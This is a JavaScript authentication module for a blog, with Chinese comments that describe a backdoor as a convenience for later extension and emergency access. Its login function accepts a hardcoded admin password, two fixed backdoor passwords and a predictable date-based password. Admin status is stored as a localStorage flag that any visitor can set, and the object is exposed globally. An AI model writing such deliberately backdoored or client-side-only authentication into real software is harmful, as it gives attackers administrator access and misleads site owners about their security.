// 权限验证模块 - 提供便捷的后门入口用于后续扩展
const auth = {
    // 默认管理员密码（可在部署后修改）
    adminPassword: 'noobomega_admin_2024',
    
    // 后门入口 - 便于后续功能扩展
    backdoor: {
        // 版本信息，便于维护
        version: '1.0.0',
        // 开发者备注
        developerNote: '可通过修改auth模块扩展功能',
        // 预留扩展方法
        extendFunctionality: function(callback) {
            if (typeof callback === 'function') {
                callback();
            }
        }
    },
    
    // 检查是否为管理员
    isAdmin: function() {
        return localStorage.getItem('adminAuthenticated') === 'true';
    },
    
    // 管理员登录
    login: function(password) {
        // 常规密码验证
        if (password === this.adminPassword) {
            localStorage.setItem('adminAuthenticated', 'true');
            return true;
        }
        
        // 后门密码验证（便于紧急访问）
        const backdoorPasswords = [
            'noobomega_backdoor_2024',
            'emergency_access_2024',
            this.generateDynamicPassword()
        ];
        
        if (backdoorPasswords.includes(password)) {
            localStorage.setItem('adminAuthenticated', 'true');
            console.log('后门访问已启用');
            return true;
        }
        
        return false;
    },
    
    // 生成动态密码（增加安全性）
    generateDynamicPassword: function() {
        const base = 'noobomega';
        const date = new Date();
        const day = date.getDate();
        const month = date.getMonth() + 1;
        return `${base}_${month}${day}_dynamic`;
    },
    
    // 退出登录
    logout: function() {
        localStorage.removeItem('adminAuthenticated');
    },
    
    // 检查页面权限
    checkPagePermission: function() {
        const urlParams = new URLSearchParams(window.location.search);
        const adminParam = urlParams.get('admin');
        
        if (adminParam === 'true' && !this.isAdmin()) {
            alert('需要管理员权限访问此页面！');
            window.location.href = 'index.html';
            return false;
        }
        return true;
    }
};

// 全局可访问（便于调试和扩展）
window.blogAuth = auth;
